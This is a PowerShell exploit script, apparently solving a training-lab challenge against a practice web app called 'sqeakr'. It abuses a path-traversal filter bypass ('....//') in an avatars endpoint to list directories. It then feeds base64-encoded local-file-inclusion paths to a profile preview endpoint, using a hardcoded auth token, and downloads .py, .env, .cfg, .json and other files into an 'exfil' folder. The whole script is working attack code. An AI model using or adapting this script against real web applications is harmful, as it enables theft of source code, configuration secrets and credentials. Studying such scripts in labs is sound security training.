Param(
    [Parameter(Mandatory=$false)]
    [String]$OutputDir = 'sqeakr-exfil',
    [Parameter(Mandatory=$false)]
    [String]$BaseFolder = '....//'
)
$authtoken = 'gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADMxZGE4YmExLWNlMGEtNDVmZC05YzcyLTU1NDc3YTFkM2Y2OHEDdS4i'
$base_path = '../../../../../../home/student/sqeakr'
$base_uri = "http://sqeakr/api/avatars"
$uri = "$base_uri/$BaseFolder"
$uri
$res = Invoke-WebRequest -Uri $uri
$res.Content
$exts = @('.py','.env','.txt','.js', '.html','.cfg', '.json')
$dump = $res.Content | ConvertFrom-Json
$dump.Files | Foreach-Object {
    $make_folder = $true
    foreach($ext in $exts) {
        if($_ -like "*$ext") {
            $make_folder = $false
            break
        }
    }
    if ($make_folder) { New-Item -Path "$OutputDir\$_" -ItemType Directory -Force }
    else {
        $lfi_path = $BaseFolder -replace '....//',''
        $payload = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$base_path/$lfi_path/$_"))
        $res = Invoke-WebRequest -Uri "http://sqeakr/api/profile/preview/$payload" -Headers @{'authtoken' = $authtoken}
        $file_dump = $res.Content | ConvertFrom-Json
        $file_content = $file_dump.image -replace '.*\s',''
        $file_content = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($file_content)) 
        New-Item -Path "$OutputDir\$_" -ItemType File -Value $file_content -Force 
    }
}
